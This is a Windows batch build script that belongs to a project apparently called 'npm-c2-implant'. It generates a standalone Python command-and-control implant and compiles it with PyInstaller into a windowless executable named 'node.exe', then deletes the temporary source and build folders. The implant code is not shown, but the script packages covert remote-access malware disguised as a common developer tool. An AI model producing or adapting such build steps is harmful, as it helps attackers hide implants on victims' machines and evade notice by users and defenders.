@echo off
setlocal

set PROJ=%~dp0
set NAME=npm-c2-implant
set VERSION=1.0.0

:: generate standalone implant
echo [+] generating standalone implant...
python "%PROJ%src\npm_c2\__main__.py" --generate-standalone > "%TEMP%\%NAME%.py" 2>&1
if %ERRORLEVEL% neq 0 (
    echo [-] failed to generate standalone
    exit /b 1
)

:: check pyinstaller
where pyinstaller >nul 2>nul
if %ERRORLEVEL% neq 0 (
    echo [-] pyinstaller not found. install with: pip install pyinstaller
    exit /b 1
)

:: compile
echo [+] compiling to exe...
pyinstaller --onefile --noconsole --name node ^
    --distpath "%PROJ%dist" ^
    --workpath "%PROJ%build" ^
    --specpath "%PROJ%build" ^
    --version-file "%PROJ%version.txt" ^
    "%TEMP%\%NAME%.py" 2>&1

if %ERRORLEVEL% equ 0 (
    echo [+] build complete: %PROJ%dist\node.exe
    del "%TEMP%\%NAME%.py" 2>nul
    rmdir /s /q "%PROJ%build" 2>nul
    rmdir /s /q "%PROJ%__pycache__" 2>nul
) else (
    echo [-] build failed
    exit /b 1
)
